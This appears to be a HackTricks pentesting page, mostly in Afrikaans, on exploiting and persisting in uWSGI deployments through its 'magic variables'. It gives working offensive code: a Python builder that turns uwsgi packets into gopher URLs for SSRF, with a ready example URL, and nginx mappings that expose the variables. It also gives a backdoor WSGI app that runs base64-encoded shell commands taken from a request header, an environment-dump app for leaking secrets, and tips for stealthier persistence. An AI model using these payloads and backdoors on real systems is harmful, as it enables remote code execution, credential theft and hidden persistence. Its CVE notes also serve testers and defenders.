# WSGI Post-Exploitation Tricks

{{#include ../../banners/hacktricks-training.md}}

## WSGI Oorsig

Web Server Gateway Interface (WSGI) is 'n spesifikasie wat beskryf hoe 'n webbediener met webtoepassings kommunikeer, en hoe webtoepassings gekoppel kan word om 'n enkele versoek te verwerk. uWSGI is een van die gewildste WSGI-servers en word dikwels gebruik om Python-webtoepassings te bedien. Sy inheemse binêre vervoer is die uwsgi-protokol (kleinletters), wat 'n bundel sleutel/waarde-parameters ("uwsgi params") na die backend-toepassingsbediener dra.

Related pages you may also want to check:

{{#ref}}
werkzeug.md
{{#endref}}

{{#ref}}
../../pentesting-web/ssrf-server-side-request-forgery/README.md
{{#endref}}

## uWSGI Uitbuiting van magiese veranderlikes

uWSGI voorsien spesiale "magiese veranderlikes" wat kan verander hoe die instansie toepassings laai en dispatch. Hierdie veranderlikes is nie normale HTTP-headers nie — dit is uwsgi-parameters wat binne die uwsgi/SCGI/FastCGI-versoek van die reverse proxy (nginx, Apache mod_proxy_uwsgi, etc.) na die uWSGI-backend gedra word. As 'n proxy-konfigurasie gebruikers-beheerde data in uwsgi-parameters map (byvoorbeeld via `$arg_*`, `$http_*`, of onveilig blootgestelde endpoints wat die uwsgi-protokol praat), kan aanvallers hierdie veranderlikes stel en code execution bereik.

### Dangerous mappings in front proxies (nginx-voorbeeld)

Misconfigurasies soos die volgende maak uWSGI magiese veranderlikes direk bloot aan gebruikerinvoer:
```
location /app/ {
include uwsgi_params;
# DANGEROUS: maps query args into uwsgi params
uwsgi_param UWSGI_FILE $arg_f;                 # /app/?f=/tmp/backdoor.py
uwsgi_param UWSGI_MODULE $http_x_mod;          # header: X-Mod: pkg.mod
uwsgi_param UWSGI_CALLABLE $arg_c;             # /app/?c=application
uwsgi_pass unix:/run/uwsgi/app.sock;
}
```
As die app of die upload-funksie toelaat dat lêers na 'n voorspelbare pad geskryf word, sal die kombinasie met die mappings hierbo gewoonlik onmiddellike RCE tot gevolg hê wanneer die backend die deur die aanvaller beheerde lêer/module laai.

### Sleutel uitbuitbare veranderlikes

#### `UWSGI_FILE` - Arbitrêre lêer-laai/uitvoering
```
uwsgi_param UWSGI_FILE /path/to/python/file.py;
```
Laai en voer ’n willekeurige Python-lêer uit as ’n WSGI-toepassing. As ’n aanvaller hierdie parameter deur die uwsgi param bag kan beheer, kan hulle Remote Code Execution (RCE) bereik.

#### `UWSGI_SCRIPT` - Skriplading
```
uwsgi_param UWSGI_SCRIPT module.path:callable;
uwsgi_param SCRIPT_NAME /endpoint;
```
Laai 'n gespesifiseerde skrip as 'n nuwe toepassing. In kombinasie met lêer-oplaai of skryfvermoëns, kan dit lei tot RCE.

#### `UWSGI_MODULE` and `UWSGI_CALLABLE` - Dinamiese module-lading
```
uwsgi_param UWSGI_MODULE malicious.module;
uwsgi_param UWSGI_CALLABLE evil_function;
uwsgi_param SCRIPT_NAME /backdoor;
```
Hierdie parameters laat toe om eender watter Python-modules te laai en spesifieke funksies daarin aan te roep.

#### `UWSGI_SETENV` - Manipulasie van omgewingsveranderlikes
```
uwsgi_param UWSGI_SETENV DJANGO_SETTINGS_MODULE=malicious.settings;
```
Kan gebruik word om omgewingsveranderlikes te wysig, wat potensieel die gedrag van die toepassing kan beïnvloed of die laai van kwaadaardige konfigurasie kan veroorsaak.

#### `UWSGI_PYHOME` - Python Omgewingsmanipulasie
```
uwsgi_param UWSGI_PYHOME /path/to/malicious/venv;
```
Verander die Python-virtuele omgewing, wat moontlik kwaadaardige pakkette of ander Python-tolke laai.

#### `UWSGI_CHDIR` - Gidsverandering
```
uwsgi_param UWSGI_CHDIR /etc/;
```
Verander die werkmap voordat versoeke verwerk word en kan met ander funksies gekombineer word.

## SSRF + uwsgi protocol (gopher) pivot

### Dreigmodel

As die teiken web-app 'n SSRF primitive blootstel en die uWSGI-instansie na 'n interne TCP-sok luister (byvoorbeeld, `socket = 127.0.0.1:3031`), kan jy die rou uwsgi-protokol via gopher gebruik en uWSGI magic variables injekteer.

Dit is moontlik omdat baie deployments intern 'n nie-HTTP uwsgi socket gebruik; die reverse proxy (nginx/Apache) vertaal kliënt-HTTP na die uwsgi param bag. Met SSRF+gopher kan jy direk die uwsgi binêre pakket saamstel en gevaarlike veranderlikes soos `UWSGI_FILE` stel.

### uWSGI protokolstruktuur (kort verwysing)

- Header (4 bytes): `modifier1` (1 byte), `datasize` (2 bytes little-endian), `modifier2` (1 byte)
- Body: sequence of `[key_len(2 LE)] [key_bytes] [val_len(2 LE)] [val_bytes]`

Vir standaard versoeke is `modifier1` 0. Die body bevat uwsgi params soos `SERVER_PROTOCOL`, `REQUEST_METHOD`, `PATH_INFO`, `UWSGI_FILE`, ens. Sien die amptelike protokolspesifikasie vir volledige besonderhede.

### Minimale pakketbouer (genereer gopher payload)
```python
import struct, urllib.parse

def uwsgi_gopher_url(host, port, params):
body = b''.join([struct.pack('<H', len(k))+k.encode()+struct.pack('<H', len(v))+v.encode() for k,v in params.items()])
pkt  = bytes([0]) + struct.pack('<H', len(body)) + bytes([0]) + body
return f"gopher://{host}:{port}/_" + urllib.parse.quote_from_bytes(pkt)

# Example URL:
gopher://127.0.0.1:5000/_%00%D2%00%00%0F%00SERVER_PROTOCOL%08%00HTTP/1.1%0E%00REQUEST_METHOD%03%00GET%09%00PATH_INFO%01%00/%0B%00REQUEST_URI%01%00/%0C%00QUERY_STRING%00%00%0B%00SERVER_NAME%00%00%09%00HTTP_HOST%0E%00127.0.0.1%3A5000%0A%00UWSGI_FILE%1D%00/app/profiles/malicious.json%0B%00SCRIPT_NAME%10%00/malicious.json
```
Voorbeeldgebruik om 'n lêer wat voorheen op die bediener geskryf is, af te dwing om gelaai te word:
```python
params = {
'SERVER_PROTOCOL':'HTTP/1.1', 'REQUEST_METHOD':'GET', 'PATH_INFO':'/',
'UWSGI_FILE':'/app/profiles/malicious.py', 'SCRIPT_NAME':'/malicious.py'
}
print(uwsgi_gopher_url('127.0.0.1', 3031, params))
```
Stuur die gegenereerde URL deur die SSRF-sink.

### Werkende voorbeeld

As jy 'n python-lêer op die skyf kan skryf (die uitbreiding maak nie saak nie) met kode soos:
```python
# /app/profiles/malicious.py
import os
os.system('/readflag > /app/profiles/result.txt')

def application(environ, start_response):
start_response('200 OK', [('Content-Type','text/plain')])
return [b'ok']
```
Genereer en aktiveer ’n gopher payload wat `UWSGI_FILE` op hierdie pad stel. Die backend sal dit importeer en uitvoer as ’n WSGI app.

## Post-Exploitation Techniques

### 1. Persistent Backdoors

#### File-based Backdoor
```python
# backdoor.py
import subprocess, base64

def application(environ, start_response):
cmd = environ.get('HTTP_X_CMD', '')
if cmd:
result = subprocess.run(base64.b64decode(cmd), shell=True, capture_output=True, text=True)
response = f"STDOUT: {result.stdout}\nSTDERR: {result.stderr}"
else:
response = 'Backdoor active'
start_response('200 OK', [('Content-Type', 'text/plain')])
return [response.encode()]
```
Laai dit met `UWSGI_FILE` en bereik dit onder 'n gekose `SCRIPT_NAME`.

#### Omgewingsgebaseerde Persistensie
```
uwsgi_param UWSGI_SETENV PYTHONPATH=/tmp/malicious:/usr/lib/python3.11/site-packages;
```
### 2. Inligtingsvrystelling

#### Omgewingsveranderlike uitlees
```python
# env_dump.py
import os, json

def application(environ, start_response):
env_data = {'os_environ': dict(os.environ), 'wsgi_environ': dict(environ)}
start_response('200 OK', [('Content-Type', 'application/json')])
return [json.dumps(env_data, indent=2).encode()]
```
#### Lêerstelseltoegang
Kombineer `UWSGI_CHDIR` met 'n file-serving helper om deur sensitiewe gidse te blaai.

### 3. Privilege Escalation idees

- As uWSGI met verhoogde voorregte loop en sockets/pids skryf wat aan root behoort, kan die misbruik van env en gidsverstellings jou help om lêers met voorregte-eienaars neer te skryf of die runtydstatus te manipuleer.
- Deur konfigurasie via environment (`UWSGI_*`) te oorskryf binne 'n lêer wat deur `UWSGI_FILE` gelaai word, kan dit die process model en workers beïnvloed om persistence stealthier te maak.
```python
# malicious_config.py
import os

# Override uWSGI configuration
os.environ['UWSGI_MASTER'] = '1'
os.environ['UWSGI_PROCESSES'] = '1'
os.environ['UWSGI_CHEAPER'] = '1'
```
## Reverse-proxy desync issues relevant to uWSGI chains (onlangs)

Deployments wat Apache httpd met `mod_proxy_uwsgi` gebruik, het onlangse response-splitting/desynchronization-bugs ervaar wat die frontend↔backend-vertalingslaag kan beïnvloed:

- CVE-2023-27522 (Apache httpd 2.4.30–2.4.55; ook relevant vir uWSGI-integrasie voor die 2.0.22/2.0.26-fixes): crafted origin response headers kan HTTP response smuggling veroorsaak wanneer `mod_proxy_uwsgi` in gebruik is. Om Apache op te gradeer na ≥2.4.56 verminder die probleem.
- CVE-2024-24795 (hersteld in Apache httpd 2.4.59; uWSGI 2.0.26 het sy Apache-integrasie aangepas): HTTP response splitting in verskeie httpd-modules kan tot desync lei wanneer backends headers inject. In uWSGI se 2.0.26 changelog verskyn dit as “let httpd handle CL/TE for non-http handlers.”

Hierdie gee nie direk RCE in uWSGI nie, maar in randgevalle kan dit met header injection of SSRF geketend word om na die uwsgi-backend te pivot. Tydens toetse, fingerprint die proxy en weergawe en oorweeg desync/smuggling primitives as 'n ingang na backend-only routes en sockets.

## References

- [uWSGI Magic Variables Documentation](https://uwsgi-docs.readthedocs.io/en/latest/Vars.html)
- [IOI SaveData CTF Writeup](https://bugculture.io/writeups/web/ioi-savedata)
- [uWSGI Security Best Practices](https://uwsgi-docs.readthedocs.io/en/latest/Security.html)
- [The uwsgi Protocol (spec)](https://uwsgi-docs.readthedocs.io/en/latest/Protocol.html)
- [uWSGI 2.0.26 changelog mentioning CVE-2024-24795 adjustments](https://uwsgi-docs.readthedocs.io/en/latest/Changelog-2.0.26.html)

{{#include ../../banners/hacktricks-training.md}}
